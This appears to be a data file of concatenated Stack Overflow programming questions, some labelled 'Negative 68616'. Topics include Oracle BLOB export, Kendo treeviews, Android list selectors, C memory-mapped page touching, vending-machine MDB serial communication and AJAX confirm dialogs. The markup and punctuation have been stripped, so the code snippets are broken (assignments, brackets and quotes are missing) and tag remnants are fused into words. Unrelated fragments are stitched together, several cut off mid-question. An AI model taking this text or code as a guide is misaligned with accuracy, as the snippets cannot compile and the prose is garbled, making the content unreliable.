Negative 68616 pI have the need the export BLOBs from our Oracle 11g 11.2.0.3 system.  The process works great for the BLOBs JPG photos that are lt 32,767 bytes.  Im able to export 4000 photos in under 5 seconds to a local directory on the database server using dbmslog.read amp utlfile.putraw.  If the file is over the 32,767 byte limit for the read buffer, this is where the performance issues start.  Ive seen similar posts about the exact performance issue, but the solutions offered have already been researched without success.  Based on monitoring tools, the CPU, IO, and memory are not being pressured during the export.  Im trying to understand why the larger BLOBs all of them are under 100K in size that have to be pieced together at 32,767 byte increments are having such a huge export slowness compared to BLOBs under 32,767 bytes.  When the large BLOBs are exported they can take up to 15 seconds per file to export.p  pa hrefhttpstackoverflow.comquestions4392491oracleblobextractionveryslowRelated Post of slow blob extractionap  pa hrefhttpstackoverflow.comquestions10456048bulkextractionoforacleblobsintofilesadvicetuninghelpneededRelated Post of BLOB export tuningap  pHas anyone experienced BLOB export slowness with files greater than 32,767 bytes  p  precodeDECLARE    CURSOR curphoto IS     select  substrc.custnum, 7, lengthc.custnum custnum,             cp.custid,             cp.photo      from customer c     inner join customerphoto cp       on c.custid  cp.custid     inner join customerdefgrpvalue cdv       on c.custid  cdv.custid    selectsql varchar2225   lfile      UTLFILE.FILETYPE   lbuffer    RAW32767   lamount    PLSINTEGER  32767   lpos       PLSINTEGER  1   lblob      BLOB   lbloblen  PLSINTEGER   lfilename  varchar2225   errornumber varchar2225   errormessage varchar2225  BEGIN   dbmsoutput.putlineStarting at   tocharsystimestamp, DDMONYYYY HHMISS.FF6   DBMSOUTPUT.ENABLE buffersize gt NULL    FOR custphoto IN curphoto LOOP     dbmsoutput.putlineIn the loop   custphoto.custid      selectsql  SELECT photo FROM customerphoto WHERE custid  custid     dbmsoutput.putlineStatement   selectsql      EXECUTE IMMEDIATE selectsql INTO lblob using custphoto.custid      lbloblen  DBMSLOB.getlengthlblob     dbmsoutput.putlineBLOB length   lbloblen       Set the filename     lfilename  custphoto.custnum  .jpg     dbmsoutput.putlineFilename   lfilename       Open the destination file.     lfile  UTLFILE.fopenjpeg, lfilename, wb, 32767      dbmsoutput.putlineStart Export at   tocharsystimestamp, DDMONYYYY HHMISS.FF6      IF lbloblen lt 32767 then       dbmsoutput.putlineBLOB lt 32767 bytes       DBMSLOB.readlblob, lbloblen, lpos, lbuffer       UTLFILE.putrawlfile, lbuffer, TRUE     ELSE  write in pieces       dbmsoutput.putlineBLOB gt 32767 bytes       WHILE lpos lt lbloblen LOOP         DBMSLOB.readlblob, lamount, lpos, lbuffer         UTLFILE.putrawlfile, lbuffer, TRUE         lpos  lpos  lamount       END LOOP     END IF       Close the file.

The GA admin page has said Status Tracking Not Installed this whole time.  However, GA RealTime actually does track my visits.  I can use Firefox on a Mac and in realtime see that on the Analytics screen, and then I can go over to a Windows computer with Chrome and visit katievb.com and see that on the realtime screen too.p  pIn blogspots settings, I intentionally did NOT populate the Settings  Other  Analytics Web Property ID because it appeared to me that that would expect that I was using the oldstyle Google Analytics ga.js and not this new kind analytics.js.p  pAlso, I then replicated this in a completely independent pair of blogspotGA accounts.p  pWhy does it say Tracking Not Installed  It seems to be tracking, and Im not sure what Im supposed to change about how I installed it.  p  pIve read the instructions many times and have tried different versions of their code and placing it in different locations, such as prior to codeltheadgtcode or codeltbodygtcode.p
Negative 68616 pWe are having a game developed by a Unity programmer.p  pThere seems to be an issue with imported PNG files we have supplied. Its a simple solid circle, and I have left some transparent space around it. Its very big, 150dpi, and then is scaled to the rightsize by the game code.p  pSometimes though, these circles appear to have a flat edge, like theres a row of pixels missing, and nothing we try seems to rectify this. p  pLooking for ideas of things to try. Is it to do with snapping Scaling issues for some reason Should it be a multiple of 256 or anything like that.p  pAnything you can suggest would be great Thanks alotp

So the solution is to update to the latest kendo release.p  hr  pIve been trying to find a good way of listing all of the nodes in a kendoui treeview, and have managed to put together a pretty solid way of doing so. First I define the dataSource, for the sake of simplicity lets sayp  precodedata  [     textelement1, items[         textelement2,         textelement3],     textelement4] codepre  pThen, I set the data source as an observableHierarchyp  precodemytreeview.setDataSourcekendo.observableHierarchydata codepre  pWhen I want to access the list of nodes, I can get a JSON object withp  precodemytreeview.dataSource.data.toJSON codepre  pThis works well it produces a correct, properlyformatted JSON object. If I call JSON.stringify on the above, I getp  precode[textelement1,items[textelement2,items[],textelement3,items[]],textelement4,items[]] codepre  pHowever, when I enable drag and drop on my tree and drag an element into a different parent, it disappears from the json output. For example, if I drag element3 into element4, the json object returned isp  precode[textelement1,items[textelement2,items[]],textelement4,items[]] codepre  pWhich is the equivalent ofp  precodedata  [     textelement1, items[         textelement2]     textelement4] codepre  pThe tables display remains correct, however, with element 3 appearing to be a child of element4.

Negative 68616 pIll give some context as to why Im trying to do this, but ultimately the context can be ignored as it is largely a classic Computer Science and C problem which must surely have been asked before, but a couple of cursory searches didnt turn up anything...p  pIm working with large real time streaming point clouds, and have a case where I need to take 234 point clouds from multiple sensors and stick them together to create one big point cloud. I am in a situation where I do actually need all the data in one structure, whereas normally when people are just visualising point clouds they can get away with feeding them into the viewer separately.p  pIm using Point Cloud Library 1.6, and on closer inspection its a hrefhttpsgithub.comPointCloudLibrarypclblob375741a0a30a5680bebe499c9bb2cc2ec988e201commonincludepclpointcloud.h relnofollowPointCloud classa under codeltpclpointcloud.hgtcode if youre interested stores all data points in an STL vector.p  pNow were back in vanilla CS land...p  pPointCloud has a  operator for adding the contents of one point cloud to another. So far so good. But this method is pretty inefficient  if I understand it correctly, it 1 resizes the target vector, then 2 runs through all Points in the other vector, and copies them over.p  pThis looks to me like a case of On time complexity, which normally might not be too bad, but is bad news when dealing with at least 300K points per cloud in real time.p  pThe vectors dont need to be sorted or analysed, they just need to be stuck together at the memory level, so the program knows that once it hits the end of the first vector it just has to jump to the start location of the second one. In other words, Im looking for an O1 vector merging method. Is there any way to do this in the STL Or is it more the domain of something like stdlistsplicep  pNote This class is a pretty fundamental part of PCL, so noninvasive surgery is preferable. If changes need to be made to the class itself e.g. changing from vector to list, or reserving memory, they have to be considered in terms of the knock on effects on the rest of PCL, which could be far reaching.p  pstrongUpdatestrong I have filed an issue over at PCLs GitHub repo to get a discussion going with the library authors about the suggestions below. Once theres some kind of resolution on which approach to go with, Ill accept the relevant suggestions as answers.p

a query on Djangos db, returning a Deferred instance.  codeprocessedDelayedRequestscode goes through that the delayed request queue and, if the query is completed, that data gets passed to codegotRowscode, which then converts it to the format I want and sends it off to codeformatresponsecode which sends the data back to the JS where it can be dealt with.  strongThats the theory anyway  the previous sentence is where I think my problem isstrong.p  pcodeprint LAST UPDATE , lastupdatecode always prints LASTUPDATE 0 but lastupdate gets updated via the JS, so this not an error.  p

It gets new data when posts are made, and seems to work pretty well otherwise.  p  pcodeprint REQUEST DATA, datacode never fires at all...

Negative 68616 pFor my internship Im creating a program that communicates with a database on the background. The program is layered in the MVCModelViewController way. p  pFor the View I want to access the data through something I called the DataAccesLayerDAL. Because that view has minimal knowledge I want it to pass an ID for the query I want to call. The calling will be done inside the DAL. Then with the ID I want to ask a class that holds the queries to return the query to then execute it inside the DAL. Picture for visualizing.p  pimg srchttpi.stack.imgur.comOpHM2.jpg altenter image description herep  pThe problem I have now is how to execute the query in my Read function.

Im probably forgetting something or missing something important. Does anyone have any experience with this kind of setup, or should be looking at a totally different solutionp  pEdit Right now it doesnt seem to execute the query, like Im missing a command in the read function. The Datacontext is filled though, thats being done in a different section of the program.p  pEdit2 Right now Im looking into the IRepository Pattern, its a great learning experience, Thank you all who took time to comment and anwserp

I have specified a codeSelectorcode to change the background colour of the selection. When the user has selected an item or not and chosen to continue to the next codeActivitycode in my control flow, I want to retrieve what he selected and feed it to my business logic.p  pMy dilemma is as follows When I use methods like codeAdapterViewgetSelectedItemcode they return codenullcode. What I would require, I think, is to check what item is activated, not selected, but there does not seem to be a method for that. At least not that I can find. If I then proceed to set an codeOnClickListenercode in my adapter and override codeonClickcode, the codeSelectorcode will seize to work. I could use methods to set the listviews item to active but then I face the problem of toggling selections basically what I had wanted to use the codeSelectorcode in the first place.p  pHere a bit of codep  pcodepersonaselector.xmlcodep  precodeltselector xmlnsandroidhttpschemas.android.comapkresandroidgt     ltitem androiddrawableandroidcolorbackgroundlight androidstateactivatedfalse gt     ltitem androiddrawableandroidcolorbackgroundlight androidstatepressedfalse gt     ltitem androiddrawableandroidcolorbackgrounddark androidstateselectedtrue gt     ltitem androiddrawableandroidcolorbackgrounddark androidstateactivatedtrue gt ltselectorgt codepre  pcodeDemoPersonaAdapter.javacodep  precodeOverride public View getViewint position, View convertView, ViewGroup parentViewGroup             final PersonaViewHolder viewHolder     final Persona persona  provider[position]      if convertView  null              convertView  LayoutInflater.fromparentViewGroup.getContext.inflateR.layout.listpersonas, null          viewHolder  new PersonaViewHolder                 ImageView convertView.findViewByIdR.id.personaicon,                 TextView convertView.findViewByIdR.id.personadescription         convertView.setTagviewHolder      else          viewHolder  PersonaViewHolder convertView.getTag           Bitmap icon  BitmapFactory.decodeResourceparent.getResources, persona.getPicture     viewHolder.setIconicon, 50, 50     viewHolder.setDescriptionpersona.getName   is a   persona.getType        convertView.setOnClickListenernew OnClickListener              Override         public void onClickView v                         ParentClassparent.setPersonapersona                   return convertView  codepre

Negative 68616 pWe are building a web app using AngularJS , C , ASP.Net Web API and Fluent NHibernate. We have decided to use DTOs to transfer data to the presentation layer  angular views. I had a few doubts regarding the general structuring and naming of DTOs. Heres an example to illustrate my scenario. Lets say I have a domain entity called Customer which looks likep  precodepublic class Customer              public virtual int Id  get set          public virtual string Name  get set          public virtual Address Address  get set          public virtual ICollectionltAccountgt Accounts  get set       codepre  pNow, in my viewspresentation layer I need to retrieve different flavors of Customer like p  p1 Just Id and Name    2 Id , Name and Address    3 Id , Name , Address and Accountsp  pI have created a set of DTOs to accomplish this p  precodepublic class CustomerEntry      public  int Id  get set      public  string Name  get set    public class CustomerWithAddress  CustomerEntry      public AddressDetails Address  get set    public class CustomerWithAddressAndAccounts  CustomerWithAddress      public ICollectionltAccountDetailsgt Accounts  get set   codepre  pAddressDetails and AccountDetails are DTOs which have all the properties of their corresponding Domain entities.p  pThis works fine for querying and data retrievals  the question is what do I use for inserts and updates. During creation of a new customer record , name and address are mandatory and accounts are optional ..so in other words I need an object with all the customer properties. Hence the confusion p  p1 What do I use for insert and updates The CustomerWithAddressAndAccounts DTO has everything in it but its name seems a bit awkward to be used for insertupdates. p  p2 Do I create another DTO .. if I do , wouldnt that be duplication as the new DTO will exactly be like CustomerWithAddressAndAccounts p  p3 Last but not least , does the DTO inheritance strcuture described above seem like a good fit for the requirement  Are there any other ways to model this p  pI have gone through other posts on this topic but couldnt make much headway. One thing that I did pickup was to avoid using the suffix DTO in the class names. I think it feels a bit superfluous.p  pWould love to hear your thoughtsp  pThanks p

Negative 68616 pFirst of all, before anyone complains, I realize that within the perspective of theoretically perfect C code, the memory model is an implementation detail that I should not rely on.  However, Im favouring performance over discipline.p  pHeres the scenario  I have a region of address space which Ive told the OS to back with a file of my choice  that is, the file is memory mapped.  If my understanding of how VMMs typically work is correct, the OS may be quite lazy about the loading of pages into my mapping and may only do this when the page actually gets touched.p  pNormally I could ignore this detail, but in this particular case, I am sending the mapped data into a worker thread pool.  If I just naively pass the worker a pointer to this buffer, theres a good chance the worker thread itself will be the one to hit a page fault when the page is first touched, and this will cause the worker to block until the page is physically loaded in by the VMM.p  pThe design of the worker pool is such that its very bad to have its threads blocking on IO, whereas the thread sending in the job can tolerate being blocked.  Therefore, I want to have my sender thread touch the mappings pages first so that the page faults will block it instead.p  pI understand that theres no emguaranteeem that touching the page first will stop a subsequent page fault in the worker thread, but still the program will be optimal most of the time and correct all of the time.p  pIn x86 assembly language this would be trivialp  precode get the pages address in ebx mov al, Byte Ptr [ebx] codepre  pUnfortunately, its not so simple in C or C.  A naive implementation would be simplep  precodechar pPage  ... char Dummy  pPage codepre  pBut, this probably wont work because any selfrespecting optimizer will realize that the code does nothing and simply omit it.p  pWe could use inline assembly, but this may badly cripple the optimizer.  We could call an assembly language function to do it but then we have admittedly small function call overhead needlessly.p  pWe could instead make codeDummycode an externallyvisible variable, which would work, because the compiler couldnt assume the assignment to be meaningless.  However, this could seriously degrade performance in multicore systems by causing contention over the CPU cache line holding codeDummycode.  Not to mention, we waste that cache line and access.p  pI also thought of doing thisp  precodechar volatile pPage  ... char Dummy  pPage codepre  pI know the codevolatilecode keyword makes two guaranteesp  ul lipThe compiler wont reorder accesses andpli lipThe compiler wont assume the value will be identical between successive reads.pli ul  pHowever, this does not seem to guarantee that the compiler will emread the value even if it doesnt need it.emp  pAny ideasp

Negative 68616 pA little back ground We are using Apache Felix implementation of OSGI for our web development Adobe CQ5 which inturn is built on apache felix. We have a few bundles of our own around 10 and each of them are configured as a project.p  pIssue During the development lifecycle, we make changes to a bundle and then use an ant script to create the bundle and deploy it in the felix. I am wondering if there is some way to enable hot deployment of the changes I make during development mode that would save developers time. p  pBased on my research, we can use the felix file install which will monitor a folders for changes to any bundles and can deploy them automatically. But this again means I need to run ant script to build the jar file and move it to the auto deploy folder the file install is watching. Is there a betterfast way to achieve this The script is currently taking a around 10 seconds approx to compile the classes, create osgi specific meta data files, bundle the classesmetadata in a new jar. Is there some way to do hot deployment, so that any change I make to a java file is automatically reflected in the bundlep  pMany thanksp

Negative 68616 pTalking in Javas context. If I want to insert in the middle of either an codeArrayListcode or a codelinkedListcode, Ive been told that codeArraylistcode will perform terribly.p  pI understand that it is because, we need to shift all the elements and then do the insertion. This should be of the order n2 i.e. On.p  pBut is not it the same for codelinkedListcode. For linked List, we need to traverse till the time we find the middle, and then do the pointer manipulation.

Negative 68616 pI am posting this as this isnt something most newbies may be familiar with. p  pstrongThe Problemstrongp  pWe have a ticketing system which makes use of a numeric id. Now some people in the company prefer to prepend zeroes to the ticket number and some people would reference it without the leading zeroes which is the correct way. So to standardize the output we have to remove the leading zeroes. p  pThis may sound simple to do, but we cant merely run a strreplace over it as this may remove valid 0s in the middle of the number.p  pNow you could preg match and do all sorts of funky things to find the answer, but the simplest is to merely cast the numeric string to an int. p  pLets user the following as an examplep  precodeltphp     correct  45678     incorrect  0045678      echo correct . ltbr gt     echo incorrect gt codepre  pAnd you should get the following printed outp  p45678p  p0045678p  pNow essentially these are the same for the application, but I would like to be able to cater for people entering the information in the incorrect format. p

Negative 68616 pIm currently trying to create an XML based website which has access to a feed URL. The XML feed is queried by adding url parameters to the current URL, and so I am using a form with GET method to add parameters to the URL. p  pI currently have a property search form which will search for properties within the feed by adding xml parameters to the url like sop  pstrongSalesminprice300000ampmaxprice500000strongp  pThis works perfectly and the correct results are shown to the user. However, if I was to use a filter form which filtered these properties by highest price for example, the feed parameters would be removed when the filter form is submitted. The new URL after the filter would be for examplep  pstrongSalespriceSortdescendingstrongp  pAs you can see, the minprice and maxprice fields have been removed completely, leaving me with unwanted properties. p  pCurrently, to combat this I am using sessions to store the URLs for each page and then combining them to make 1 url. I understand that using sessions within MVC based applications isnt exactly recommended.p  pSo, Im really just wondering if there is a better way to store the urls rather than using sessionsp  pAny help would be much appreciated.p  pThanks in advance.p  pSOME CODE SNIPPETS OF THE SITEp  pstrongModel and ViewModelstrongp  precode    public class ResultsViewModel       public PropertyResult[] Property  get set     public class PropertyResult      public int Count  get set      public int Pid  get set      public int RentalPeriod  get set      public string Price  get set       public string Address  get set      public string NameNumber  get set      public string SA1  get set      public string SA2  get set      public string Town  get set      public string City  get set      public string County  get set      public string Postcode  get set       public string LocationCode  get set       public string PriceText  get set      public string Primary1  get set      public string Secondary1  get set      public string Secondary2  get set      public string Description  get set       public string Period  get set       public int Bedrooms  get set      public int Receptions  get set      public int Bathrooms  get set      public int Garages  get set      public int Gardens  get set       public bool Featured  get set      public int Views  get set   codepre  pstrongControllerstrongp  precodetry                      var xml  XElement.LoadresultsFeed              var query  from props in xml.Descendantsproperty                          select new PropertyResult                                                         property id                              Pid  Convert.ToInt32props.Attributeid.Value,                                Rooms Count                              Bedrooms  Convert.ToInt32props.Attributebedrooms.Value,                              Receptions  Convert.ToInt32props.Attributereceptions.Value,                              Bathrooms  Convert.ToInt32props.Attributebathrooms.Value,                              Gardens  Convert.ToInt32props.Attributegardens.Value,                              Garages  Convert.ToInt32props.Attributegarages.Value,                                1  sales prop, 4  lettings prop                              RentalPeriod  Convert.ToInt32props.Attributerentalperiod.Value,                               Period  props.Attributeperiod.Value,                                address                               Address  props.ElementuseAddress.Value,                              NameNumber  props.Elementnum.Value,                              SA1  props.Elementsa1.Value,                              SA2  props.Elementsa2.Value,                              Town  props.Elementtown.Value,                              City  props.Elementcity.Value,                              County  props.Elementcounty.Value,                              Postcode  props.Elementpostcode.Value,                                location code                              LocationCode  props.Elementlocationcodes.Value,                              Featured  Convert.ToBooleanprops.Attributefeatured.Value,                                description                              Description  props.ElementsummaryDescription.Value,                                price                              Price  props.Attributeprice.Value,                              PriceText  props.Elementpricetext.Value,                                  images                              Primary1  httplb.dezrez.comImagingPictureResizer.ASPPosition1ampAgentId  eaid  ampBranchId bid  ampwidth1000ampCategoryPrimaryampPropertyId,                              Secondary1  httpwww.dezrez.comestateagentsoftwareImageResizeHandler.doampphotoID2ampAgentID1239ampBranchID1976ampWidth1000ampPropertyId,                              Secondary2  httpwww.dezrez.comestateagentsoftwareImageResizeHandler.doampphotoID3ampAgentID1239ampBranchID1976ampWidth1000ampPropertyId,                          .ToArray codepre  pstrongViewstrongp  pIm currently accessing each node like sop  precodeModel.Property[i].Gardens codepre

Negative 68616 pIm just starting to learn creating iOS apps and so Im just a noob in it. Especially because of the different approach it has on handling navigation and interaction between UI and Code. p  pOk Im using xCode 5 with SDK version 7. I created a single view application and it gave me a code.storyboardcode file which I guess replaces the code.xibcode which used to be there when I watch tutorial videos. p  pSo I designed a simple UI as the codemaincode view and now I want to have another view as the codelandingcode view. So it should come in before the codemaincode view. I went ahead and from codeNew File...code I created an ObjectiveC class which is a subclass of codeUIViewControllercode and named it codeDetailcode. Surprisingly it gave me a code.xibcode file again. Fair enough. Then I just put a simple input in the UI to just preview it. p  pThen from Project Settings, in the General tab, I changed the codeMain Interfacecode to match the new code.xibcode file I created. But when I launched the application, it crashed and I dont know what the problem is. p  pHere is the stack tracep  precode20131127 183121.735 TestViewSwitching[1012370b]  Terminating app due to uncaught exception NSUnknownKeyException, reason [ltUIApplication 0x8b35dc0gt setValueforUndefinedKey] this class is not key value codingcompliant for the key view.

Negative 68616 pAs far as I understood it, one reason to use Cs allocators for my own container would be that I can seperate allocation and construction.p  pNow, I wonder if this is possible for stdtuples in the following way Each time I construct an stdtuple, the space is reserved, but the objects are not constructed yet. Instead, I can use the allocator in order to construct the ith argument just when I want to.p  pPseudoCodep  precodestruct mystruct      const bool b  note that we can use const     mystructint x  bx42    int main      stdtupleltint, mystructgt t      the tuple knows an allocator named myallocator here      this allocator will force the stack to reserve space for t,      but the contained objects are not constructed yet.      myallocator.constructstdgetlt0gtt, 42      this line just constructed the first object, which was an int     myallocator.constructstdgetlt1gtt, stdgetlt0gtt      this line just constructed the 2nd object      with help of the 1st one      return 0  codepre  pOne possible problem is that allocators are usually bound to a type, so Id need one allocator per type. Another question is whether the memory for the stdtuple must be allocated on the heap, or if stack might work. Both is ok for me.p  pStill, is it possible somehow Or if not, could this be done with an allocator I write my ownp

The unknown word is presented in a text box and the list of allowed words is in a combo box below.  I would like the combo box to present a suggestion based on the unknown word.  i.e. the unknown word is Excavation and one of the allowed words in the combo box is Excavate.  I would like the combo box to suggest the term Excavate.  My problem is that autocomplete doesnt offer a suggestion because the unknown word is longer than the allowed word. p  pMy thought on solving the problem is to do the following  Parse the unknown word into a character array.  Add the characters one at a time to the combo box text property and allow autocomplete to run.  As soon as autocomplete stops working, remove one character and insert the word that autocomplete suggests.p  pMy problem is I cannot find anything to tell me once auto complete has stopped working.p  pAny thoughts, suggestions, or alternate approaches welcome.p  pThanks in advance,p  pWillp

Negative 68616 pI was always confused about what the name attribute did in html forms. From the textbook I read html and css, design and build webpages by John Duckett, this is what it said about the name attribute.p  precodeWhen users enter information  into a form, the server needs to  know which form control each  piece of data was entered into.  For example, in a login form, the  server needs to know what has  been entered as the username  and what has been given as the  password. Therefore, each form  control requires a name attribute.  The value of this attribute  identifies the form control and is  sent along with the information  they enter to the server. codepre  pFrom reading this, I always thought that, say in the database there is a field called theUsersPasswordField and a field called theUsersUsernameField. I thought that, suppose there is a registration form, then the form would be likep  precodeltform actionaURL methodpostgt     ltpgtPlease enter what you want your Username to beltpgt     ltinput typesubmit nametheUsersUsernameField gt     ltpgtPlease enter what you want your Password to beltpgt     ltinput typepassword nametheUsersPasswordField gt ltformgt codepre  pand then this way, when the information is sent to the database, it will know which information to put in the theUsersPasswordField and which information to put in the theUsersUesrnameField.

Negative 68616 pIm new to serial communication. For a project I have to develop software for a vending machine. The vending machine basically consists of a host computer a windows xp machine and various peripherals. One of those peripherals is a coin acceptor. According to the documentation of the vending machine, the host computer communicates with the coin acceptor using the serial port. The only documentation I have is this document called MultiDrop Bus  Internal Communication Protocol the version I have can be found here a hrefhttpwww.coinacceptor.com.cnUploadEditorFilestechnicalfileMdbversion42.pdf relnofollowhttpwww.coinacceptor.com.cnUploadEditorFilestechnicalfileMdbversion42.pdfa.p  pAccording to the docs it seems I have to create a serial port connection using a baud rate of 9600, 1 start bit, 1 stop bit, 1 mode bit and 8 data bits page 29 in the linked document. The vending machine docs state that the coin acceptor is on COM port 6. I tried to create a connection like this using HyperTerminal and Putty. My first question isp  ol liHow do I properly create a connection to a device that supports this MDB protocol Putty and HyperTerminal dont allow me to set a mode bit. I didnt find anything about the flow control and parity bit in the document. Can this be done using Putty or HyperTerminal Or do I need some other tool to communicate over MDBli ol  pMy second question is about how to send a command to the device. I looked through the commands and saw a RESET command. According to the document, upon receiving the RESET command the device should reset itself and respond with an ACK. According to pages 33 and 63 of the document, if I want to send the RESET command to the coin acceptor, I can send the HEX value 08H over the serial line. Page 33 states that the coin changer listens to commands sent to addresses 08H until 10H if Im interpreting the document correctly, that is. Page 63 states that the RESET command is 08H with no data bytes. So can I just type 08H into Putty and hit enter to send this command to the device Or how can I send this command to the device over the serial line Is this even the right approach or am I looking in the completely wrong place The vending machine docs only contain this document for the coin acceptor. Thank you for the helpp  pKind regardsp  pChrisp

Negative 68616 pI work with surveys and would like to export a large number of tables drawn from data frames into an .xlsx or .csv file. I use the codexlsxcode package to do this. This package requires me to stipulate which column in the excel file is the first column of the table. Because I want to paste multiple tables into the .csv file I need to be able to stipulate that the first column for table n is the length of table n1  x number of spaces. To do this I planned on creating values like the following. p  pdt is made by changing a table into a data frame. p  precodetable1 lt tabledfy, dfx dt1 lt as.data.frame.matrixtable1 codepre  pHere I make the values for the number of the starting column p  precodestartcol1  1 startcol2  NCOLdt1  3 startcol3  NCOLdt2  startcol2  3 startcol4  NCOLdt3  3  startcol2  startcol3 codepre  pAnd so on. I will probably need to produce somewhere between 50100 tables. Is there a way in R to make this an iterative process so I can create the 50 values of starting columns without having to write 50 lines of code with each one building on the previousp  pI found stuff on stack overflow and other blogs about writing for  loops or using apply type functions in R but this all seemed to deal with manipulating a vector as opposed to adding values to the workspace. Thanksp

Negative 68616 pThe company I work for takes Credit Applications over the phone for clients. We already have most of their info before they call in to do the application, so I wrote some AJAX to prepopulate the form.p  pAs the operator types their info into the form, onKeyUp, JavaScript checks against the server to see if it can narrow down the results to one match. Once there is a single match, Javascript shows a confirm box with the users info. If the info is correct, operator hits OK and the fields are prepopulated with the data from the server.p  pMy code works, but sometimes the server doesnt respond immediately and with the AJAX being called onKeyUp we often get multiple popup confirm boxes consecutively and have to hit OK over and over to get back to the form.p  pI have tried several things to prevent this. I have a dropdown which allows the Operator to choose between synchronous JavaScript and Async Js, when set to sync, we only get one confirm, but the user is not able to type in the input fields until the server is done sending responses. Ive tried some other things but none of them work 100.p  pHere is the current version of what is implemented, heavily commented just for SO  What suggestions can the SO community offer to prevent multiple confirm boxes from showingp  precodevar showPopUp  true  set to false once confirm is chosen to prevent additional pop ups var stopPop  0  count the number of popups prevented  function startAjax     ifdocument.getElementByIdflag.value  yes ampamp showPopUp  preliminary check to avoid unnecessary calls         if window.XMLHttpRequest xmlhttppnew XMLHttpRequest else xmlhttppnew ActiveXObjectMicrosoft.XMLHTTP           do stuff with server response..         xmlhttpp.onreadystatechangefunction             ifxmlhttpp.readyState4 ampamp xmlhttpp.status200                  get values from XML response..                 var status  xmlhttpp.responseXML.getElementsByTagNamestatus[0].firstChild.nodeValue                 var fname  xmlhttpp.responseXML.getElementsByTagNamefname[0].firstChild.nodeValue                 var addr  xmlhttpp.responseXML.getElementsByTagNameaddr[0].firstChild.nodeValue                 var lname  xmlhttpp.responseXML.getElementsByTagNamelname[0].firstChild.nodeValue                 var city  xmlhttpp.responseXML.getElementsByTagNamecity[0].firstChild.nodeValue                 var state  xmlhttpp.responseXML.getElementsByTagNamestreet[0].firstChild.nodeValue                 var zip  xmlhttpp.responseXML.getElementsByTagNamezip[0].firstChild.nodeValue                 var email  xmlhttpp.responseXML.getElementsByTagNameemail[0].firstChild.nodeValue                  show the status of the request in the status box                 document.getElementByIdajaxstatus.innerHTMLstatus                  if the status is bingo then the correct result was found, do stuff with it                 ifstatus  Bingo                      make sure confirm box wasnt already shown before showing another one                     ifshowPopUp                          ask user if the result returned is the correct one before populating the fields                         var confirmMsg  User FoundnnName fname lnamenAddress addrnCity citynState statenZip zipnEmail emailnnClick OK To populate fields or click Cancel if this is not the correct info.                         var fillOrNot  confirmconfirmMsg                          after the user has confirmed the info from the server, set showPopUps to false to prevent additional confirm boxes, populate input values                         iffillOrNot                             showPopUp  false                             document.getElementByIdfirstname1.value  fname                             document.getElementByIdlastname1.value  lname                             document.getElementByIdflag.valueno                         else                             showPopUp  false                             document.getElementByIdflag.valueyes2                             document.getElementByIdajaxstatus.innerHTMLAborted                                              else                          If server returns a response after a user confirms a previous response, count the number of responses and show it in the AJAX status box                         stopPop                         document.getElementByIdajaxstatus.innerHTML  Stopped stopPop pop ups                                                                                         get parameters for request         var param1  document.getElementByIdfirstname1.value         var param2  document.getElementByIdlastname1.value         var param3  document.getElementByIdaddress.value         var url  ajaxhandler.phpfnameparam1amplnameparam2ampaddrparam3          determine sync or async from drop down menu         var e  document.getElementByIdasync         var strUser  e.options[e.selectedIndex].value         var asy  true         ifstrUser  false             asy  false                   Do request         xmlhttpp.openGET,url,asy         xmlhttpp.sendnull       codepre  pThanks for lookingp

Negative 68616 pThe ServiceStack website has build  install instructions for windows Nuget.  There are many posts referring to mono based ServiceStack, but never any instructions for how to build on Centos for example.  I downloaded and built ServiceStack on windows and tried to bring the files over to Centos.  So far this has not worked for my integration with monofastcgi.  I get errors in the browser Parser Error Message Cannot find type ServiceStack.Examples.Host.Web.Global for example.  This particular error is not really my question, unless it can get me further towards a ServiceStack installation that works.

Negative 68616 pIm trying to communicate with a USB device that uses interrupt transfer for communications. it is emnotem a polled device, either side may send at any time. All the examples I find seem to be pollresponse where you send data first, wait for the send to complete, then wait for the response, process it and then go back to sending data again.p  pMy code is modeled after the following which I found here on stackoverflow Im showing the original I based it on because my own code has a lot more going on and is less compactp  precode  boolean retval  request.queuebuffer, 1      if mConnection.requestWait  request             wait for confirmation request was sent          UsbRequest inRequest  new UsbRequest            URB for the incoming data          inRequest.initializemConnection, mEndpointIn            the direction is dictated by this initialisation to the incoming endpoint.          ifinRequest.queuebuffer, bufferMaxLength  true               mConnection.requestWait                 wait for this request to be completed                at this point buffer contains the data received                codepre  pThe second requestWait will block until something arrives, so I cant do another TX operation until I receive something  What am I missingp

Negative 68616 pI am relatively new to JavaScript so this may seem like a dumb question. Is it possible to have multiple div elements with different id ors class names be dragged and dropped in to one droppable area The examples I have seen online always define the droppable area to accept only one item of a specific class or id name. p  pIn my use case I would like to have my droppable zone to accept to different items  one called .forms and the other called .pages and then take the appropriate action depending on which kind of element was dropped. Is this possible and how would one go about itp  pThanks. p

This question will attempt to produce one such use case, but make no claim to the viability thereof only that it is a conceivable scenario which may present itself in a real world situation. li liYou must find the optimum solution to satisfy the requirement. The use case was chosen specifically for its real world applications. You may not agree with the decisions that were made but are not tasked to give an opinion only to deliver the solution.li liSatisfy the requirement without modifying the input or choice of transport.

Negative 68616 pIm using a tool called Redsim to monitor the DIS Distributed Interactive Simulation information that is being sent over a network, and am using a tool called LVC Game developed by Calytrix technologies to present that information on a web page. The two tools are completely separate i.e. they both get the details about the DIS information on the network independently.p  pBoth of these tools only provide the option to view ALL of the DIS information that is being sent over the network. Given that some of the simulations I am running over the network are very large, I am looking at developing a tool myself which will allow the user to manipulate what DIS information they are presented with.p  pAlthough I have heard of DIS in the past, I have never worked with it, so this is my first experience of using DIS.p  pHaving had a bit of a search for information regarding DIS, and found that there is a DIS library available for Java, I am wondering if there are any tutorials available for Java development with DIS Specifically, tutorials for how to capture monitor the DIS information that is being sent and received over a network Any help or guidance on this would be much appreciated.p

